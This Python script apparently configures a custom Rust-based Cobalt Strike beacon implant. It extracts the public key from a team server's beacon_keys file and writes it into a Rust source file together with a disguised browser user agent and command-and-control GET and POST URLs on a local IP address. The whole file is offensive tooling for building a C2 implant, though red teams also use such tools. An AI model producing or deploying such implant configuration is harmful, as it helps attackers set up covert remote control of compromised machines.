# pip3 install javaobj-py3
import javaobj
import base64

C2_GET_URL = "http://192.168.1.106:8080/fwlink"
C2_POST_URL = "http://192.168.1.106:8080/submit.php?id="
USER_AGENT = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; Avant Browser)"
BEACON_KEYS_PATH = ".cobaltstrike.beacon_keys"

config_code_tpl = """
pub const PUB_KEY: &str = "-----BEGIN PUBLIC KEY-----
{}
-----END PUBLIC KEY-----";
pub const USER_AGENT: &str = "{}";
pub const C2_GET_URL: &str = "{}";
pub const C2_POST_URL: &str = "{}";
"""

try:
    with open(BEACON_KEYS_PATH, "rb") as f:
        key = javaobj.loads(f.read())
    priv = bytes(c & 0xFF for c in key.array.value.privateKey.encoded)
    pub = bytes(c & 0xFF for c in key.array.value.publicKey.encoded)
    pub_line = base64.encodebytes(pub).strip().decode().replace("\r", "").replace("\n", "")
    chunks = [pub_line[i:i+64] for i in range(0, len(pub_line), 64)]
    public_key = "\n".join(chunks)
    code = config_code_tpl.format(public_key, USER_AGENT, C2_GET_URL, C2_POST_URL)
    with open("src/profile.rs", "w", encoding="utf8") as f:
        f.write(code)
        print("success write to src/profile.rs")
except Exception as e:
    print("Exception: ", e)
